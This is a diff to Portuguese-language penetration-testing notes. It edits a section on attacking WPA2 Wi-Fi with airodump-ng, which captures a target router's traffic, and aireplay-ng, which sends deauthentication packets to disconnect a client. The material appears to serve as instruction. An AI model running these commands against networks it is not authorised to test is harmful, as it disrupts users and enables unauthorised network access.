@@ -5065,11 +5065,13 @@ Quando escutando no BSSID que é do roteador alvo e receber o MAC da estação e
 
 - Atacando o protocolo WPA2
 
-    airodump-ng wlan0mon -c1 --bssid MAC ADDRESS -w captura.wpa2.cap
+Após deixar a placa em modo de captura habilitado, rodar o comando abaixo para monitorar os sinais próximos.
+
+	airodump-ng wlan0mon -c1 --bssid MAC ADDRESS -w captura.wpa2.cap
 
 Coloca em modo de captura salvando em arquivo.cap
 
-    aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 
+	aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 
 
 Manda 10 pacotes de  desautenticação. 
 
